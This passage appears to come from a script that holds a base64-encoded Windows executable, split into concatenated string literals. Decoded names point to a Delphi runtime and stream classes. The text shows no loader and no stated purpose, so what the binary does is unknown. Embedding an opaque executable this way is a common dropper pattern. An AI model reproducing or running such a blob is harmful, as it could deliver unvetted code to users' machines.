'g+gEiwCNVfyS6K7s//+F23QFg+sEixtTi0X86Mjp//9AUIvG6FPl//9Qi0X86Kbp//9ZWuij/f//hcB+DYvQSo1F/Oh07P//6wiNRfzo8uf//4tF+ItV/Ogj6P//M8BaWVlkiRBoOmdAAI1F/OjS5///w+nE2P//6/BeW4vlXcNVi+xqAFNWi/KL2DPAVWiDZ0AAZP8wZIkgjUX8i9PoJen//4tF/IvW6F/+//8zwFpZWWSJEGiKZ0AAjUX86ILn' + 
'///D6XTY///r8F5bWV3DkFNWgcQE8P//UIvyi9iF23Q9gXsEAAABAH0qaAAQAACNRCQEUItDBFCLA4sA6C/1//9Q6Jmq//+LyIvUi8bo7uD//+sKi8aLUwTo6uH//4HEABAAAF5bw5D/JZiEUwCLwFWL7DPAVWhEaEAAZP8wZIkg/wWwNUMAdS24SDBDAOiRy///uBQyQwDoh8v//7jgM0MA6H3L///olMX//7hIEEMA6Jrf//8zwFpZWWSJEGhL' + 
'aEAAw+mz1///6/hdw41AAP8lNIVTAIvA/yUwhVMAi8D/JSyFUwCLwP8lKIVTAIvA/yUkhVMAi8D/JSCFUwCLwFBqQOjI////w41AALgMAAAAw4vAU+jy////i9iF23Q2gz2YF0MA/3UKuOIAAADoXd7//4vD6Mb///+FwHUMuOIAAADoSN7//+sMUKGYF0MAUOii////W8O4DAAAAIXAdB/oev///6OYF0MA6KT///+hmBdDAFDodf///6P4V0MA' + 
'w41AALgMAAAAhcB0K4M9mBdDAP90IqGYF0MAUOhP////hcB0E1DoLf///2oAoZgXQwBQ6ED////DjUAAuAwAAACFwHQZ6Lr///+DPZgXQwD/dAuhmBdDAFDoCv///8OQig3sV0MAoZgXQwCEyXUmZIsVLAAAAIsEgsPoFf///6GYF0MAUOjm/v//hcB0AcOh+FdDAMNQ6NX+//+FwHTbw7icF0MA6ML4///DkLqcF0MAg30MAXUqUFLGBexXQwAB' + 
'i00IiQ3wV0MAiUoEx0IIAAAAAMdCDAAAAADowf///1pY/zX0V0MAubQXQwDoA9r//8OLwFWL7DPAVWihakAAZP8wZIkg/wU4WEMAD4WCAAAAuPxXQwDotd3//7gAWEMA6Kvd//+4BFhDAOih3f//uAhYQwDol93//7gMWEMA6I3d//+4EFhDAOiD3f//uBRYQwDoed3//7gYWEMA6G/d//+4HFhDAOhl3f//uCBYQwDoW93//7gkWEMA6FHd//+4' + 
'KFhDAOhH3f//uCxYQwDoPd3//zPAWllZZIkQaKhqQADD6VbV///r+F3Di8D/JQyHUwCLwP8lCIdTAIvA/yUEh1MAi8D/JQCHUwCLwP8l/IZTAIvA/yX4hlMAi8D/JfSGUwCLwP8l8IZTAIvA/yXshlMAi8D/JeiGUwCLwP8l5IZTAIvA/yXghlMAi8D/JdyGUwCLwP8l2IZTAIvA/yXUhlMAi8D/JcyGUwCLwP8lyIZTAIvA/yXIhlMAi8D/JcSG' + 
'UwCLwP8lwIZTAIvA/yW8hlMAi8D/JbiGUwCLwP8ltIZTAIvA/yWwhlMAi8D/JayGUwCLwP8lqIZTAIvA/yWkhlMAi8D/JaCGUwCLwP8lnIZTAIvA/yWYhlMAi8D/JZSGUwCLwP8lkIZTAIvA/yWMhlMAi8D/JYiGUwCLwP8lhIZTAIvA/yWAhlMAi8D/JXyGUwCLwP8leIZTAIvA/yV0hlMAi8D/JXCGUwCLwP8lbIZTAIvA/yVohlMAi8D/JWSG' + 
'UwCLwP8lYIZTAIvA/yVchlMAi8D/JViGUwCLwP8lVIZTAIvA/yVQhlMAi8D/JUyGUwCLwP8lSIZTAIvA/yVEhlMAi8D/JUCGUwCLwP8lPIZTAIvA/yU4hlMAi8D/JTSGUwCLwP8lMIZTAIvA/yUshlMAi8D/JSiGUwCLwP8lJIZTAIvA/yUghlMAi8D/JRyGUwCLwP8lGIZTAIvA/yUUhlMAi8D/JRCGUwCLwP8lDIZTAIvA/yUIhlMAi8D/JQSG' + 
'UwCLwP8lAIZTAIvA/yX8hVMAi8D/JfiFUwCLwP8l9IVTAIvA/yXwhVMAi8D/JeyFUwCLwP8l6IVTAIvA/yXkhVMAi8D/JeCFUwCLwP8l3IVTAIvA/yXYhVMAi8D/JdSFUwCLwP8l0IVTAIvA/yXMhVMAi8D/JciFUwCLwP8lxIVTAIvA/yXAhVMAi8D/JbyFUwCLwP8luIVTAIvA/yW0hVMAi8D/JbCFUwCLwP8lrIVTAIvA/yWohVMAi8D/JaSF' + 
'UwCLwP8loIVTAIvA/yWchVMAi8D/JZiFUwCLwP8llIVTAIvA/yWQhVMAi8D/JYyFUwCLwP8liIVTAIvA/yWAhVMAi8D/JXyFUwCLwP8leIVTAIvA/yVohVMAi8D/JWSFUwCLwP8lXIVTAIvA/yVghVMAi8D/JViFUwCLwP8lcIVTAIvA/yVshVMAi8D/JVSFUwCLwP8lUIVTAIvA/yVMhVMAi8D/JUiFUwCLwP8lRIVTAIvA/yVAhVMAi8D/JTyF' + 
'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' + 
'U1ZXi9iLewyF/3wkhcl8IItzCCv3hfZ+FzvOfQKL8YtDBAPHi87oMbr//wFzDOsCM/aLxl9eW8Nmg+kBcgl0DGb/yXQM6xCJUAzrCwFQDOsGA1AIiVAMi0AMw5BTVuitx///i9qL8IvG6BoAAACL04Di/IvG6JbE//+E234Hi8boM8f//15bw1OL2DPSi8PoDAAAADPAiUMIM8CJQwxbw1NRiRQki9iL1IvDiwj/URyL0ItLCIvD6Dz///+LBCSJ' + 
'QxBaW8ONQABTVleL8ovYi3sMi9aLw+jF////iXMIO/d9DWa5AgAz0ovDixj/UxRfXlvDkFNWV4M6AH4Xiwo7SAh0EIsKgcH/HwAAgeEA4P//iQqLcASLzosai3gQO990O4M6AHULi8boi/f//zPJ6yuF/3UTodQmQwAPtwCLEuhI9///i8jrFIsN1CZDAA+3CYsSi8boQvf//4vIi8FfXlvDi8BTVldVi/GL6ovYi0MMhcB8OIX2fDSL+AP+hf9+' + 
'LDt7CH4RO3sQfgmL14vD6Az///+JewiLUwQDUwyLxYvO6La4//+JewyLxusCM8BdX15bw/BXQwDw/wAA8FdDAPH/AADwV0MA8v8AAPBXQwDz/wAA8FdDAPT/AADwV0MA9f8AAPBXQwD2/wAA8FdDAPf/AADwV0MA+P8AAPBXQwD5/wAA8FdDAPr/AADwV0MA+/8AAPBXQwD8/wAA8FdDAP3/AADwV0MA/v8AAPBXQwD//wAA8FdDAOD/AADwV0MA' + 
'4f8AAPBXQwDi/wAA8FdDAOP/AADwV0MA5P8AAPBXQwDl/wAA8FdDAOb/AADwV0MA5/8AAPBXQwDo/wAA8FdDAOn/AADwV0MA6v8AAPBXQwDr/wAA8FdDAOz/AADwV0MA7f8AAPBXQwDu/wAA8FdDAO//AADwV0MA0P8AAPBXQwDR/wAA8FdDANL/AADwV0MA0/8AAPBXQwDU/wAA8FdDANX/AADwV0MA1v8AAPBXQwDX/wAA8FdDANj/AADwV0MA' + 
'2f8AAPBXQwDa/wAA8FdDANv/AADwV0MA3P8AAPBXQwDd/wAA8FdDAN7/AADwV0MA3/8AAPBXQwDA/wAA8FdDAMH/AADwV0MAwv8AAPBXQwDD/wAA8FdDAMT/AADwV0MAxf8AAPBXQwDG/wAA8FdDAMf/AADwV0MAyP8AAPBXQwDJ/wAA8FdDAMr/AADwV0MAy/8AAPBXQwDM/wAA8FdDAM3/AADwV0MAzv8AAPBXQwDP/wAA8FdDALD/AADwV0MA' + 
'sf8AAPBXQwCy/wAA8FdDALP/AADwV0MAtP8AAPBXQwC1/wAA8FdDALb/AADwV0MAt/8AAPBXQwC4/wAA8FdDALn/AADwV0MAuv8AAPBXQwC7/wAA8FdDALz/AADwV0MAvf8AAPBXQwC+/wAA8FdDAL//AADwV0MAoP8AAPBXQwCh/wAA8FdDAKL/AADwV0MAo/8AAPBXQwCk/wAA8FdDAKX/AADwV0MApv8AAPBXQwCn/wAA8FdDAKj/AADwV0MA' + 
'qf8AAPBXQwCq/wAAmHpAAAAAAAAAAAAAmHpAAAAAAAAAAAAAAAAAAAAAAACqekAADAAAAGQQQADsPEAA+DxAAPw8QAAAPUAA9DxAAHg6QACUOkAA0DpAAA4AAAAAAAEAAABIEEAABAAAAAlFeGNlcHRpb24Ae0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB7QAAQAAAATHpAAOw8QAD4PEAA/DxAAAA9QAD0PEAAeDpAAGTDQADQOkAA' + 
'DkVIZWFwRXhjZXB0aW9ukFx7QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXHtAABAAAAC0ekAA7DxAAPg8QAD8PEAAAD1AAPQ8QAB4OkAAZMNAANA6QAAMRU91dE9mTWVtb3J5jUAAuHtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4e0AAEAAAAEx6QADsPEAA+DxAAPw8QAAAPUAA9DxAAHg6QACUOkAA0DpAAAtFSW5PdXRF' + 
'cnJvchB8QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEHxAABAAAABMekAA7DxAAPg8QAD8PEAAAD1AAPQ8QAB4OkAAlDpAANA6QAAJRUV4dGVybmFsi8BofEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGh8QAAQAAAAxHtAAOw8QAD4PEAA/DxAAAA9QAD0PEAAeDpAAJQ6QADQOkAAEkVFeHRlcm5hbEV4Y2VwdGlvbpDIfEAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMh8QAAQAAAAxHtAAOw8QAD4PEAA/DxAAAA9QAD0PEAAeDpAAJQ6QADQOkAACUVJbnRFcnJvcovAIH1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgfUAAEAAAAHx8QADsPEAA+DxAAPw8QAAAPUAA9DxAAHg6QACUOkAA0DpAAApFRGl2QnlaZXJvkHh9QAAAAAAAAAAAAAAAAAAAAAAA' + 
'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' + 
